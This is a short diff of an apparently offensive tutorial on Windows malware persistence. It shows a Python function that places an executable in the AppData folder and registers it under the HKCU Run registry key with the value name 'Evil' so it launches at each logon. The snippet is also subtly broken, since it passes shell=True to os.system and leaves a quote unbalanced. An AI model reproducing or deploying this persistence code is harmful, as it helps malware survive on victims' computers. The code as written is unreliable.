@@ -14,7 +14,7 @@ Some of the techniques used in Malware Windows - Persistence(Registry HKCU,start
 ### Registry Key
 ```python
 
-def reg_windows1(self):
+def reg_windows():
   from os import system , environ
   malw_location = environ["appdata"]+"\\anyname.exe" # You can add any name to your Malware and any other path other than this <appdate>
   system('reg add "HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Run" /v Evil /t REG_SZ /d'+ malw_location +'"', shell=True)  
